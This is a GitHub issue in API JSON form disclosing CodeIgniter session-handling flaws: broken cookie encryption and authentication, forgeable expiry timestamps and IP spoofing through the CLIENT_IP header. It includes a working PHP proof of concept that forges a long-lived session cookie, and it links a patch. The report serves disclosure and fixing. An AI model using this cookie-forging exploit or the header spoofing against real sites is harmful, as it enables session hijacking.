{"url":"https://api.github.com/repos/bcit-ci/CodeIgniter/issues/1702","repository_url":"https://api.github.com/repos/bcit-ci/CodeIgniter","labels_url":"https://api.github.com/repos/bcit-ci/CodeIgniter/issues/1702/labels{/name}","comments_url":"https://api.github.com/repos/bcit-ci/CodeIgniter/issues/1702/comments","events_url":"https://api.github.com/repos/bcit-ci/CodeIgniter/issues/1702/events","html_url":"https://github.com/bcit-ci/CodeIgniter/issues/1702","id":6199916,"node_id":"MDU6SXNzdWU2MTk5OTE2","number":1702,"title":"Multiple vulnerabilities in session management. ","user":{"login":"TheRook","id":521783,"node_id":"MDQ6VXNlcjUyMTc4Mw==","avatar_url":"https://avatars.githubusercontent.com/u/521783?v=4","gravatar_id":"","url":"https://api.github.com/users/TheRook","html_url":"https://github.com/TheRook","followers_url":"https://api.github.com/users/TheRook/followers","following_url":"https://api.github.com/users/TheRook/following{/other_user}","gists_url":"https://api.github.com/users/TheRook/gists{/gist_id}","starred_url":"https://api.github.com/users/TheRook/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/TheRook/subscriptions","organizations_url":"https://api.github.com/users/TheRook/orgs","repos_url":"https://api.github.com/users/TheRook/repos","events_url":"https://api.github.com/users/TheRook/events{/privacy}","received_events_url":"https://api.github.com/users/TheRook/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"closed","locked":false,"assignee":null,"assignees":[],"milestone":null,"comments":19,"created_at":"2012-08-13T19:29:33Z","updated_at":"2014-01-26T19:57:12Z","closed_at":"2012-10-13T08:39:05Z","author_association":"NONE","type":null,"active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"**EDIT**\nThe following vulnerabilities have been patched in my branch:\n\nCWE-649: Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking\nCWE-329: Not Using a Random IV with CBC Mode\nCWE-327: Use of a Broken or Risky Cryptographic Algorithm \n  Two violations of this.  One is using md5,  the other is using the \"XOR Encode\" algorithm. \nCWE-291: Trusting Self-reported IP Address\n\nPatch:\nhttps://github.com/TheRook/CodeIgniter/commit/27d1e61f4964da5182e4076653e5300ec31ab643\n\nHere is just me having some fun:\n\nORIGINAL POST:\nCode Igniter has multiple flaws with its session handler.  The `'sess_encrypt_cookie'`, `'sess_match_ip'`, `'sess_expiration'`, `'sess_match_useragent'` can all be undermined.  The result is that after an attacker intercepts a cookie (owasp a9) then she can build an immortal cookie that can be used from any ip address using any browser.  \n\nThere is nothing in CI that prevents an OWASP a9 violation.   In order to deal with OWASP a9 all applications must use HTTPS for the lifetime of an authenticated session. (period)\n\n1) 'sess_encrypt_cookie':\n\nFirst of all if encryption is disabled,  then the application uses a non-RFC hmac using md5() which means its not easy to modify the cookie.  This is the only time an authentication block is included with the cookie.   Ironically if you enable encryption,  you disable authentication.  Clearly not the design of a professional cryptographer.After all md5 is a broken hash function,  and you are not using a valid hmac.\n\nAll other cookie modes used by CI are a clear violation of CWE-807, and a CVE should be issued.\n\nIf encrypted cookies are enabled and php-mcrypt is present then AES-256 in CBC mode is used.  An authentication block is not used,  `_add_cipher_noise()` is some strange home-brew  nonsense that is not a valid method of authentication.  The cipher text could be modified without the application recognizing the attack.  However a small modification to the cipher text will yield large changes to the resulting plain text due to the avalanche effect.  Cryptographically possible,  but it would require a fair amount of processing power to create a valid cookie.\n\nIf encrypted cookies are enabled,  and php-mcrypt isn't installed, then it will silently fall back on `_xor_encode()`.   `_xor_encode()` is a home-brew stream cipher built into Code Igniter.   If a professional cryptographer implemented this they would just use a native PHP implementation of AES.  But that is what peer review is for!\n\nSo how bad can some home-brew crypto system be?\nWell this system uses a global secret key that is passed though either MD5 or SHA1.  The resulting hash is in hex form.  That means that a given byte is xor'ed with one of the 16 following characters `['0','1','2','3','4','5','6','7','8','9','0','a','b','c','d','e','f']`.  A stream cipher like RC4 will produce a PRNG stream that is a full byte with 256 possible values,  not just one of 16 values.\n\nThis system also introduces a random key that is included with the message.  This is kind of like an IV in that the cipher text will always be different,  even if the plain text is the same.  However unlike an IV this random key makes the message twice as large,  which is undesirable.  In the PHP PoC below we are modifying one of these random key bytes and replacing it with another hex character,  this will result in a smaller change in the resulting plain text and for the purposes of the PoC it is more likely to produce a int value.   An attacker could iterate over all 256 possibilities,  however its not necessary.\n\nThe real vulnerability comes down to lack of authentication with a stream cipher,  so even if this application was using an accepted stream cipher like RC4 this attack would still be valid.   If you know the byte placement,  then you can modify that byte.  This attack could be used to modify any information in the cookie struct including  \"user_data\", which is custom state tracked by the application.\n\n2) 'sess_expiration':\n\nDue to broken authentication,  or lack of authentication the last_activity (as well as every other value in the cookie struct) value is attacker controlled.\n\n``` php\n<?php\n// Is the session current?\nif (($session['last_activity'] + $this->sess_expiration) < $this->now)\n{\n    $this->sess_destroy();\n    return FALSE;\n}\n```\n\nIf your run the PHP PoC at the end of this file you'll get a number of last_activity values to choose from.  Some are timestamps far in the past like 1044813800,  other far into the future like 1944813800.   1944813800 is an ideal timestamp because it creates a cookie that an attacker can use for authentication for a very long time. This code never checks that the last_activity was in the future `($session['last_activity'] > $this->now)`.\n\n3) 'sess_match_useragent'\n\nThis check is worthless.  This is check is exactly equivalent to a security feature that is a GET variable that says is_attacker=False.  If an attacker intercepts a cookie (owasp a9 violation) then he will also have the useragent.  This value is also non-random and easy to brute force if need be (but you'll never need to do that,  seriously this check is completely and totally worthless and should be removed).\n\n4) 'sess_match_ip'\n\nStright forward exploitation. The Firefox addon modify-headers can be used to add the 'CLIENT_IP' http header to every request.\n\nIP Address spoofing vulnerability in /codeigniter/core/Input.php:\n\n``` php\n<?php\nif (config_item('proxy_ips') != '' && $this->server('HTTP_X_FORWARDED_FOR') && $this->server('REMOTE_ADDR'))\n{\n    $proxies = preg_split('/[\\s,]/', config_item('proxy_ips'), -1, PREG_SPLIT_NO_EMPTY);\n    $proxies = is_array($proxies) ? $proxies : array($proxies);\n\n    $this->ip_address = in_array($_SERVER['REMOTE_ADDR'], $proxies) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];\n}\nelseif ( ! $this->server('HTTP_CLIENT_IP') && $this->server('REMOTE_ADDR'))\n{\n    $this->ip_address = $_SERVER['REMOTE_ADDR'];\n}\nelseif ($this->server('REMOTE_ADDR') && $this->server('HTTP_CLIENT_IP'))\n{\n    $this->ip_address = $_SERVER['HTTP_CLIENT_IP'];\n}\nelseif ($this->server('HTTP_CLIENT_IP'))\n{\n    $this->ip_address = $_SERVER['HTTP_CLIENT_IP'];\n}\nelseif ($this->server('HTTP_X_FORWARDED_FOR'))\n{\n    $this->ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];\n}\n\n\n/****************************/\n\n/***Simple PoC to bypass the _xor_encode() encrypted sessions***/\n/*\nCode taken from /codeigniter/libraries/Encrypt.php\n*/\n/*\n * XOR Encode\n *\n * Takes a plain-text string and key as input and generates an\n * encoded bit-string using XOR\n *\n * @param    string\n * @param    string\n * @return    string\n */\nfunction _xor_encode($string, $key)\n{\n    $rand = '';\n    do\n    {\n        $rand .= mt_rand(0, mt_getrandmax());\n    }\n    while (strlen($rand) < 32);\n\n    $rand = sha1($rand);\n\n    $enc = '';\n    for ($i = 0, $ls = strlen($string), $lr = strlen($rand); $i < $ls; $i++)\n    {\n        $enc .= $rand[($i % $lr)].($rand[($i % $lr)] ^ $string[$i]);\n    }\n\n    return _xor_merge($enc, $key);\n}\n\n// --------------------------------------------------------------------\n\n/**\n * XOR Decode\n *\n * Takes an encoded string and key as input and generates the\n * plain-text original message\n *\n * @param    string\n * @param    string\n * @return    string\n */\nfunction _xor_decode($string, $key)\n{\n    $string = _xor_merge($string, $key);\n\n    $dec = '';\n    for ($i = 0, $l = strlen($string); $i < $l; $i++)\n    {\n        $dec .= ($string[$i++] ^ $string[$i]);\n    }\n\n    return $dec;\n}\n\n// --------------------------------------------------------------------\n\n/**\n * XOR key + string Combiner\n *\n * Takes a string and key as input and computes the difference using XOR\n *\n * @param    string\n * @param    string\n * @return    string\n */\nfunction _xor_merge($string, $key)\n{\n\n    $hash = sha1($key);//or maybe md5()...\n    $str = '';\n    for ($i = 0, $ls = strlen($string), $lh = strlen($hash); $i < $ls; $i++)\n    {\n        $str .= $string[$i] ^ $hash[($i % $lh)];\n    }\n\n    return $str;\n}\n/******************* end of CI's code *******************/\n```\n\n``` php\n<?php\n/****************** start of PoC ************************/\n//Encryption key generated by a CI application. \n$key=\"Jiu348^&H%fa\";\n//Example cookie value that would be encrypted by CI\n$sesion='a:4:{s:10:\"session_id\";s:32:\"ce02b80a4701d4b818274eeecec97db8\";s:10:\"ip_address\";s:9:\"127.0.0.1\";s:10:\"user_agent\";s:76:\"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0\";s:13:\"last_activity\";i:1344813800;}';\n\n//The $cipher_text is what the attacker could sniff.\n$cipher_text=_xor_encode($sesion,$key);\n//debug:\n//print $cipher_text;\n$plain_text=_xor_decode($cipher_text,$key);\n//$cipher_text=base64_decode($cipher_text);\nprint \"<br>plain text len:\".strlen($cipher_text).\"<br>cipher text len:\".strlen($plain_text).\"<br><br>\";\n\n// $cipher_text[$ci_len-23] is a magic number.\n// With this encryption scheme every other byte is a randomly generated byte which is xor'ed with the byte next to it.\n// The value of last_activity within the seralized session starts at plain_text-12 which means it starts at cipher_text-24\n// The value ends at plain_text-2 and cipher_text-4\n// 22 is at position 2 which should be a big enough time increase.\n$ci_len=strlen($cipher_text);   \n$longest=0;\n$long_cookie=\"\";\n\n$hex=array('0','1','2','3','4','5','6','7','8','9','0','a','b','c','d','e','f');\nforeach($hex as $h){\n    $cipher_text[$ci_len-23]=$h;\n    //Cryptographic oracle.\n    $plain_text=_xor_decode($cipher_text,$key);\n    //print($plain_text);\n    $c=unserialize($plain_text);\n    if(intval($c[last_activity])){\n        print $c[last_activity].\"<br>\";\n        print $cipher_text.\"<br>\";\n        if(intval($c[last_activity])>$longest){\n            $longest=$c[last_activity];\n            $long_cookie=$cipher_text;\n        }\n    }\n}\nprint \"<br>Longest Valid Time:\".$longest.\"<br>\";\nprint \"<br>Longest Valid Time Cookie:<br/>\".$long_cookie;\n```\n","closed_by":{"login":"narfbg","id":1058011,"node_id":"MDQ6VXNlcjEwNTgwMTE=","avatar_url":"https://avatars.githubusercontent.com/u/1058011?v=4","gravatar_id":"","url":"https://api.github.com/users/narfbg","html_url":"https://github.com/narfbg","followers_url":"https://api.github.com/users/narfbg/followers","following_url":"https://api.github.com/users/narfbg/following{/other_user}","gists_url":"https://api.github.com/users/narfbg/gists{/gist_id}","starred_url":"https://api.github.com/users/narfbg/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/narfbg/subscriptions","organizations_url":"https://api.github.com/users/narfbg/orgs","repos_url":"https://api.github.com/users/narfbg/repos","events_url":"https://api.github.com/users/narfbg/events{/privacy}","received_events_url":"https://api.github.com/users/narfbg/received_events","type":"User","user_view_type":"public","site_admin":false},"reactions":{"url":"https://api.github.com/repos/bcit-ci/CodeIgniter/issues/1702/reactions","total_count":1,"+1":1,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/bcit-ci/CodeIgniter/issues/1702/timeline","performed_via_github_app":null,"state_reason":"completed"}